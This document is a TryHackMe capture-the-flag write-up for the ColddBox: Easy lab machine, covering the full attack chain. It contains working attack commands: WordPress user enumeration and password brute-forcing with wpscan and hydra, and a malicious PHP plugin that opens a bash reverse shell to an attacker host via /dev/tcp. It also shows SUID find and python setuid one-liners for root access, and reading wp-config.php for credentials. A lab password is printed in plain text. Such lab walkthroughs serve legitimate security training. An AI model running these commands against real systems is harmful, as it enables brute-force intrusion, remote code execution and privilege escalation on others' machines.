# TryHackMe ColddBox: Easy Writeup

---

## Nmap Scan 

```
nmap -sCV -Pn -p- coldboxeasy.thm
```

```ruby
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8=
|   256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

```
http://coldboxeasy.thm
```

<img width="1865" height="769" alt="image" src="https://github.com/user-attachments/assets/7136d123-dabf-483a-a539-7af6b30ec1c6" />

## Wpscan

```
wpscan --url http://coldboxeasy.thm -e u
```

#### found users 

<img width="816" height="584" alt="image" src="https://github.com/user-attachments/assets/54ef3e2a-1c8b-4aba-b4a2-3fd7c51348d7" />

```
philip
c0ldd
hugo
the cold in person
```

## burte force password for users

```
wpscan --url http://coldboxeasy.thm \
--usernames c0ldd \
--passwords /usr/share/wordlists/rockyou.txt

```

> ## or you can user hydra

```
hydra -L wpusers -P /usr/share/wordlists/rockyou.txt coldboxeasy.thm -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

<img width="720" height="547" alt="image" src="https://github.com/user-attachments/assets/098df48c-a618-403a-86dd-523a706ae3f0" />

```
c0ldd : 9876543210
```

<img width="1890" height="790" alt="image" src="https://github.com/user-attachments/assets/14ead7fb-5c1b-4d80-ae59-4b72461c7281" />

## Remote Shell

Having a quick look around in there are no interesting posts or pages so let's  upload a `php reverse shell` as a plugin

### shell.php

```php
<?php
/**
 * Plugin Name: Shell
 */

system('bash -c "bash -i >& /dev/tcp/tun0_ip/4444 0>&1"');
?>

```

```bash
zip shell.zip shell.php
```

<img width="1549" height="551" alt="image" src="https://github.com/user-attachments/assets/4618b1a8-cb87-47ba-aea2-331d8a65a922" />

<img width="802" height="206" alt="image" src="https://github.com/user-attachments/assets/b944ecbb-3a5f-4b54-93f7-6bbd6184ed4e" />

## open listener then click activate 

```
nc -lnvp 4444
```

<img width="1109" height="330" alt="image" src="https://github.com/user-attachments/assets/4b287e3f-ea22-4d48-8e20-62267415e3f1" />

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## privillage esc

> ## find **`suid`** files permissions

```
find / -perm -4000 -type f 2>/dev/null
```

<img width="896" height="452" alt="image" src="https://github.com/user-attachments/assets/2624b095-5dd1-4007-b272-5ddf7d33d227" />

##[gtfobins](https://gtfobins.org/gtfobins/find/)

<img width="1239" height="354" alt="image" src="https://github.com/user-attachments/assets/03af2b3e-3232-40a2-be94-f6312c898bc7" />

 
```
find . -exec /bin/sh -p \; -quit
```

<img width="1215" height="232" alt="image" src="https://github.com/user-attachments/assets/617352c1-5d52-43cd-8d7b-ae3bd4f5cfd7" />

## get full root

```
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
python3 -c 'import os; os.setgid(0); os.system("/bin/bash")'
```

<img width="1117" height="164" alt="image" src="https://github.com/user-attachments/assets/f3981ba5-2169-4e2f-b143-e0e0c9eb452e" />

-------------------

## another way to do letral movment 

```
cat wp-config.php
```

<img width="824" height="151" alt="image" src="https://github.com/user-attachments/assets/d8d54499-448e-4b78-a6a3-f801e48eaa86" />

```
su - c0ldd
```

<img width="1233" height="157" alt="image" src="https://github.com/user-attachments/assets/af1d38cb-f2a3-48b5-a2de-d48d10b115dd" />

```
sudo -l
```

[gtfobins](https://gtfobins.org/gtfobins/ftp/)

<img width="1182" height="384" alt="image" src="https://github.com/user-attachments/assets/f2f7c073-3aa7-4783-8e4a-d2ea2aa61a69" />

